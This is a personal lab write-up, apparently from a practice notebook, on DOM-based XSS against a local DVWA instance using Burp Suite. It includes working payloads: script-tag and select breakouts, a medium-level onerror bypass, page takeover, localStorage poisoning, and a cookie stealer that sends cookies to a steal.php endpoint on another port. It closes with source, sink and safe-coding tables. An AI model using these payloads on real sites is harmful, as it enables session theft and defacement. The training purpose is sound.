# DOM XSS


## What is DOM XSS?
DOM XSS is a type of client-side XSS where the vulnerability exists entirely in the browser, JavaScript running on the page reads attacker-controlled input (a source), and then writes it into the page in a dangerous way (a sink). No server modification is required for the exploit to run.



# DOM XSS Methodology
- This our `Target`: http://192.168.100.97:8080/vulnerabilities/xss_d/
<img width="722" height="579" alt="image" src="https://github.com/user-attachments/assets/a8b96f0a-a49f-475f-bd56-0733297ae473" />

- If in this i choose some `Language` it will show first:
<img width="722" height="523" alt="image" src="https://github.com/user-attachments/assets/479baba3-cf94-43e3-a6c8-619cd45d3c2b" />


- So in this i used it with my `Burp Suite`, so first open our `Burp`:
<img width="897" height="822" alt="image" src="https://github.com/user-attachments/assets/2a18e6d5-e834-4ce2-8144-57c73bb3c05a" />

- And `Past` our target to `New` browser:
<img width="913" height="873" alt="image" src="https://github.com/user-attachments/assets/5dd77d78-f4d0-4685-bd1f-e7b623f72855" />

<img width="899" height="696" alt="image" src="https://github.com/user-attachments/assets/cafd8757-2150-463c-b5fc-c2ac17f37304" />

- In this we see our target `Request`, after `right` click on it:
<img width="1575" height="867" alt="image" src="https://github.com/user-attachments/assets/cd79be94-3f04-4583-978b-6f2cfff7f773" />

<img width="1081" height="503" alt="image" src="https://github.com/user-attachments/assets/665eba26-bca0-4ab5-839b-e24de3e7fcf5" />

<img width="1576" height="685" alt="image" src="https://github.com/user-attachments/assets/ab38fe75-a024-46d2-b7a7-5a31bac9b3d0" />

- If in this i choose `French` it show this:
<img width="920" height="605" alt="image" src="https://github.com/user-attachments/assets/c5200943-3ab3-4e99-b8da-f9d22b632fe3" />

- After go back to our `Burp`:
<img width="1577" height="672" alt="image" src="https://github.com/user-attachments/assets/01a92ea0-4530-4fd4-a936-289c7c899427" />

<img width="1176" height="286" alt="image" src="https://github.com/user-attachments/assets/f2f041cf-91f9-4f6f-9209-e3087e99d177" />

- And after add `<script>alert(1)</script>` this to `URL`: http://192.168.100.97:8080/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E
After Press `Enter`:
<img width="917" height="601" alt="image" src="https://github.com/user-attachments/assets/02e53b57-dc2d-4d75-afd5-c54b1592da51" />

- After Press `Enter` it show this:
<img width="1122" height="713" alt="image" src="https://github.com/user-attachments/assets/c2c9b6e0-ad7a-4ecc-bd2c-cf1086a4656d" />

<img width="1576" height="877" alt="image" src="https://github.com/user-attachments/assets/7af453ba-e046-442e-98bf-84cdce0d4aa3" />

- After we click `Do Intercept` click on `Forward`:
<img width="1080" height="527" alt="image" src="https://github.com/user-attachments/assets/85fa6d38-0dfc-4e16-b314-0abc412ca2a2" />

- In this we will see `malicious Target`:
<img width="1580" height="803" alt="image" src="https://github.com/user-attachments/assets/0ae19f62-4526-4a21-81b4-ad53e495f416" />

- Or in this we can check in direct in target:
<img width="921" height="806" alt="image" src="https://github.com/user-attachments/assets/8f4739e5-95e3-4bcd-8a3e-494a7f80d0e2" />

- And click on `Forward` it will show this `Right-click` → `View Page Source` and look for:
<img width="917" height="647" alt="image" src="https://github.com/user-attachments/assets/b2f08e40-9301-4c75-bbc9-d483d0434f90" />

<img width="1671" height="807" alt="image" src="https://github.com/user-attachments/assets/3733a3db-8f14-4535-ba7f-5cb13fbd5eb1" />


#### Or we can send it to Repeater
<img width="1582" height="810" alt="image" src="https://github.com/user-attachments/assets/dbea43a2-c260-448e-89f2-91c911a43f11" />

<img width="1606" height="811" alt="image" src="https://github.com/user-attachments/assets/2da7e4d0-eeb3-49ca-b0d3-30cd24621c05" />

- In this we can change to others `Payload`.



---


## BASIC DOM XSS EXPLOITATION (LOW SECURITY)
- In this i used it with my `DVWA`, so firt i need t set it to `Low`. Also i used with my `Burp`:

### Simple Alert via Script Tag
<img width="1616" height="675" alt="image" src="https://github.com/user-attachments/assets/4707121b-b950-40e6-a5e8-adb3fa83d04e" />

- In `Brwoser` i test with `test123`:
<img width="1334" height="120" alt="image" src="https://github.com/user-attachments/assets/54289f19-6dbe-4c16-9ded-56de8b4a3099" />

<img width="1075" height="501" alt="image" src="https://github.com/user-attachments/assets/0abc7d33-8e35-494b-8382-8fe76db9a865" />

<img width="1575" height="873" alt="image" src="https://github.com/user-attachments/assets/e748b414-9c4a-4a2d-8054-4fb3ef595350" />

<img width="1583" height="486" alt="image" src="https://github.com/user-attachments/assets/c7887ef1-2bab-488c-9d65-eb2520d4676d" />

<img width="1573" height="852" alt="image" src="https://github.com/user-attachments/assets/07189174-5c4f-4d42-ba80-48e8cd9e1228" />

<img width="809" height="637" alt="image" src="https://github.com/user-attachments/assets/59bc399c-c14c-4c60-bc5d-a70a769afab3" />

- But in this it not work good.

---

- I use direct in `URL`: http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English<script>alert('DOM XSS')</script>
<img width="914" height="653" alt="image" src="https://github.com/user-attachments/assets/74c4c1a7-70a9-4f4f-8e4f-647616110081" />



### Break Out of Select Tag
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English</option></select><script>alert('Breakout')</script>
````
<img width="916" height="586" alt="image" src="https://github.com/user-attachments/assets/a187afb3-a6d5-46f2-b9d7-95626ebeda6f" />

---



## COOKIE STEALING WITH DOM XSS


###  Basic Cookie Alert

````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English<script>alert('Cookies: '+document.cookie)</script>
````
<img width="921" height="636" alt="image" src="https://github.com/user-attachments/assets/2f3bb9c0-e62d-4c52-b527-b421b72e063a" />



### uto Cookie Stealer
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English%3Cscript%3Evar%20cookies%20=%20document.cookie;var%20img%20=%20new%20Image();img.src%20=%20%27http://192.168.100.97:8000/steal.php?cookie=%27%20+%20encodeURIComponent(cookies);alert(%27Cookies%20sent%20to%20attacker%27);%3C/script%3E
````
- OR we can use this:
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English<script>
var cookies = document.cookie;
var img = new Image();
img.src = 'http://192.168.100.97:8000/steal.php?cookie=' + encodeURIComponent(cookies);
alert('Cookies sent to attacker');
</script>
````
<img width="915" height="552" alt="image" src="https://github.com/user-attachments/assets/344fff64-8601-4f01-9044-e26823b1b406" />

---



## ADVANCED DOM MANIPULATION

### Complete Page Takeover
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English%3Cscript%3Edocument.body.innerHTML%20=%20`%3Cdiv%20style=%22text-align:center;padding:50px;background:black;color:lime;%22%3E%20%20%3Ch1%3E%F0%9F%92%80%20DOM%20XSS%20DEMONSTRATION%20%F0%9F%92%80%3C/h1%3E%20%20%3Cp%3EThis%20page%20has%20been%20compromised%20via%20DOM-based%20XSS%3C/p%3E%20%20%3Cp%3ECookies:%20${document.cookie}%3C/p%3E%20%20%3Cbutton%20onclick=%22history.back()%22%3EGo%20Back%3C/button%3E%3C/div%3E`;%3C/script%3E
````

<img width="915" height="415" alt="image" src="https://github.com/user-attachments/assets/9889d118-b04b-47ce-ba84-aa5ce1753925" />


---


## PERSISTENT DOM ATTACKS

### Local Storage Poisoning
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English%3Cscript%3E//%20Store%20malicious%20script%20in%20localStoragelocalStorage.setItem(%27payload%27,%20%27%3Cscript%3Ealert(%22Persistent%20XSS%22)%3C/script%3E%27);//%20Create%20auto-execute%20on%20next%20visitlocalStorage.setItem(%27autopayload%27,%20%27setTimeout(function(){alert(%22Auto-execute%20on%20visit%22)},1000)%27);//%20Check%20if%20it%20workedalert(%27LocalStorage%20poisoned:%20%27%20+%20localStorage.getItem(%27payload%27));%3C/script%3E
````
<img width="1577" height="537" alt="image" src="https://github.com/user-attachments/assets/f20a8853-e483-4942-86f2-17e4f361fc1b" />

- In this we click on `Select` we will see more than this:
<img width="1232" height="312" alt="image" src="https://github.com/user-attachments/assets/9ea3a1ab-c0ee-44e0-9d8a-1cef7d025a59" />

---


## URL FRAGMENT ATTACKS

### Using Fragment Identifier (#)
- DOM XSS can also use URL fragments (after #):
````
http://192.168.100.97:8080/vulnerabilities/xss_d/#<script>alert('Fragment XSS')</script>
````
<img width="1003" height="641" alt="image" src="https://github.com/user-attachments/assets/8ada9b37-b3d1-4505-b594-ab1478b54a89" />

- In this we have not good result.

### Fragment with Existing Parameters
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English#<script>alert('Both params and fragment')</script>
````
<img width="1315" height="637" alt="image" src="https://github.com/user-attachments/assets/2251076c-c493-4eaf-93b2-7fffd9a6418c" />

---



## BYPASSING SECURITY LEVELS

### Medium Security Bypasses
- In this i set it to `Medium`:
<img width="886" height="766" alt="image" src="https://github.com/user-attachments/assets/08fccc39-8ff7-41a6-8f5d-ab2e75f9145b" />

#### Nested Breakout:
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English</option></select><img src=x onerror=alert(1)>
````

<img width="1007" height="640" alt="image" src="https://github.com/user-attachments/assets/c7892461-e971-4ce6-bd4e-16144455638f" />

<img width="898" height="488" alt="image" src="https://github.com/user-attachments/assets/162b3db8-9568-4871-a560-7595e4d7c0c8" />

---



## SOURCE AND SINK ANALYSIS

### Common DOM XSS Sources
| **Source Type** | **Example**              | **Description**                                                                         |
| --------------- | ------------------------ | --------------------------------------------------------------------------------------- |
| **URL Sources** | `document.location`      | Gets the full URL of the current page. Often used to extract query parameters or paths. |
|                 | `document.location.href` | Returns the entire URL as a string; can be changed to redirect users.                   |
|                 | `document.location.hash` | Returns the fragment (the part after `#`) in a URL.                                     |
|                 | `document.URL`           | Returns the full URL of the current document.                                           |
|                 | `document.referrer`      | Returns the URL of the previous page (where the user came from).                        |
|                 | `window.location`        | Same as `document.location`; gives full access to the page’s URL.                       |



### Common DOM XSS Sinks
| **Sink**                                               |                                                         **What it does** | **Why it’s dangerous**                                                                                       | **Safer alternative / mitigation**                                                                                                                                        |
| ------------------------------------------------------ | -----------------------------------------------------------------------: | ------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `document.write()`                                     |              Writes string HTML into the document stream (during parse). | Injected HTML/JS can run immediately; it can overwrite page and enable XSS.                                  | Avoid entirely. Build DOM with `createElement()` + `appendChild()`.                                                                                                       |
| `document.writeln()`                                   |                           Same as `document.write()` but adds a newline. | Same risks as `document.write()` (XSS, DOM replacement).                                                     | Same: use DOM APIs or templating libraries that auto-escape.                                                                                                              |
| `element.innerHTML`                                    |                      Sets or reads an element’s HTML markup as a string. | If attacker-controlled content is inserted, scripts/tags execute → XSS.                                      | Use `textContent` / `innerText` for plain text. If HTML needed, sanitize input with a library (DOMPurify) before assigning.                                               |
| `element.outerHTML`                                    |     Replaces the element and its contents with the provided HTML string. | Replacing the whole node with attacker data can inject scripts and change structure — XSS and DOM tampering. | Use safe DOM manipulation; sanitize any HTML first.                                                                                                                       |
| `element.insertAdjacentHTML()`                         | Parses and inserts HTML at a specified position relative to the element. | Inserts untrusted HTML into the DOM without escaping — XSS risk.                                             | Sanitize the HTML first; prefer `createElement()` for structure.                                                                                                          |
| `eval()`                                               |                        Evaluates a string as JavaScript code at runtime. | Executes arbitrary code — severe remote code execution & XSS vector.                                         | Never use. Replace with real functions, parsers, or `JSON.parse()` for JSON. Use safer logic branching.                                                                   |
| `setTimeout()` / `setInterval()` (when given a string) |    Can accept a function or a string to evaluate after a delay/interval. | If a string is passed, it behaves like `eval()` — execution of arbitrary code strings.                       | Always pass a function reference, never a string. e.g. `setTimeout(fn, 1000)`.                                                                                            |
| `Function()`                                           |    Constructs a new function from strings (like `new Function('code')`). | Equivalent to `eval()` — executes attacker-controlled code.                                                  | Don’t use. Define functions normally or use safe interpretation patterns.                                                                                                 |
| (General sink note)                                    |                                                                        — | Many sinks execute HTML/JS when given untrusted strings.                                                     | Apply *output encoding*, *input validation*, *contextual escaping*, CSP, and use trusted sanitization libraries. Prefer building nodes instead of inserting HTML strings. |





###  Identify Vulnerable Patterns
#### Vulnerable code:

| **Category / Example**                                                                                            | **Why It’s Dangerous**                                                                                                                          | **Safe Alternative**                                                                                                                                                                                                                                                                |   |                                                                                                                                             |
| ----------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | - | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **Direct usage**<br>`js<br>var userData = location.hash.substring(1);<br>document.write(userData);<br>`           | `document.write()` directly injects untrusted data (from URL hash). If the attacker puts `<script>` in the hash, it will execute — **DOM XSS**. | ```js<br>const userData = location.hash.substring(1)                                                                                                                                                                                                                                |   | "";<br>document.getElementById("output").textContent = userData;<br>```<br>→ Use `textContent` to safely display text without executing it. |
| **String concatenation**<br>`js<br>var message = "Welcome " + location.href;<br>element.innerHTML = message;<br>` | `innerHTML` executes HTML/JS inside the string. If attacker controls `location.href`, they can inject tags or scripts.                          | `js<br>const safeHref = location.href;<br>element.textContent = "Welcome " + safeHref;<br>`<br>→ Use `textContent` instead of `innerHTML`.                                                                                                                                          |   |                                                                                                                                             |
| **Eval with user input**<br>`js<br>var code = localStorage.getItem('userCode');<br>eval(code);<br>`               | `eval()` executes whatever string is stored in `localStorage`. If an attacker injects code there, it runs in full — **remote code execution**.  | `js<br>const raw = localStorage.getItem("userAction");<br>try {<br>  const data = JSON.parse(raw);<br>  if (data.action === "setTheme") applyTheme(data.value);<br>} catch (e) {<br>  console.error("Invalid data");<br>}<br>`<br>→ Parse JSON, validate input, and avoid `eval()`. |   |                                                                                                                                             |


#### Safe Code:

| **Category / Example**                                                                                                                    | **Why It’s Safe**                                                                                                                                                                | **Key Security Practice**                                                                                                                                                                       |
| ----------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Sanitization**<br>`js<br>var userData = DOMPurify.sanitize(location.hash.substring(1));<br>document.write(userData);<br>`               | `DOMPurify.sanitize()` cleans any malicious HTML or script tags from user input before rendering, preventing **DOM-based XSS**.                                                  | Use a **trusted sanitization library** (like [DOMPurify](https://github.com/cure53/DOMPurify)) before writing any user-controlled HTML to the page.                                             |
| **Using `textContent` instead of `innerHTML`**<br>`js<br>var message = "Welcome " + location.href;<br>element.textContent = message;<br>` | `textContent` treats everything as plain text — even if `location.href` includes HTML or JS, it will be displayed safely, not executed.                                          | Always use **`textContent`** or **`innerText`** to display user data safely (avoids executing injected code).                                                                                   |
| **Avoiding `eval()`**<br>`js<br>var code = localStorage.getItem('userCode');<br>// Use alternative to eval<br>`                           | Not using `eval()` means no direct code execution from user input, preventing **Remote Code Execution (RCE)**. You can safely handle data using parsing and whitelisted actions. | Replace `eval()` with **structured logic**, for example:<br>`js<br>const data = JSON.parse(localStorage.getItem('userAction'));<br>if (data.action === "setTheme") applyTheme(data.value);<br>` |



---





## Most Effective DOM XSS Payloads:

### Basic test
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English<script>alert('DOM XSS')</script>
````
<img width="425" height="140" alt="image" src="https://github.com/user-attachments/assets/d676511b-6fb2-476c-9a23-17d92c652882" />

### Cookie test
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script>
````
<img width="427" height="250" alt="image" src="https://github.com/user-attachments/assets/d3a0ef6a-22a5-4745-b352-5bb5044849e2" />


### Page takeover
````
http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English<script>document.body.innerHTML='HACKED'</script>
````
<img width="829" height="202" alt="image" src="https://github.com/user-attachments/assets/8ad4b322-4eb8-4c69-9538-a32962b18655" />


---


## Finished Of DOMXSS


---

## Practice By: Nin KAnong (k4n0ng)

---

---

### Date: 28/10/2025

---
